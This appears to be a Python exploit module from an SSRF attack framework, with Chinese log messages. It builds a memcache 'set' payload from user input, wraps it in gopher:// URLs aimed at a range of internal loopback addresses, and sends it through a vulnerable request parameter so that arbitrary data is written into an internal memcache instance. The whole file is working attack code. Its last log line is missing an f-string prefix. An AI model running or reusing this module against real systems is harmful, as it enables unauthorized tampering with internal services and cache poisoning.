import logging
import urllib.parse

from core.utils import *

name = "memcache"
description = "在 memcache 实例中存储数据"
author = "Swissky"
documentation = []


class exploit:
    SERVICE_IP = "127.0.0.1"
    SERVICE_PORT = "11211"
    SERVICE_DATA = "\r\n"

    def __init__(self, requester, args):
        logging.info(f"模块 '{name}' 已启动！")
        gen_host = gen_ip_list("127.0.0.1", args.level)
        payload = input("要存储的数据: ")

        self.SERVICE_DATA += f"set payloadname 0 0 {len(payload)}\r\n"
        self.SERVICE_DATA += f"{payload}\r\n"
        self.SERVICE_DATA += "quit\r\n"
        self.SERVICE_DATA = urllib.parse.quote(self.SERVICE_DATA)

        for service_ip in gen_host:
            payload = wrapper_gopher(self.SERVICE_DATA, service_ip, self.SERVICE_PORT)

            if args.verbose == True:
                logging.info(f"生成的 payload : {payload}")

            r = requester.do_request(args.param, payload)

            if args.verbose == True:
                logging.info("模块 '{name}' 已结束！")
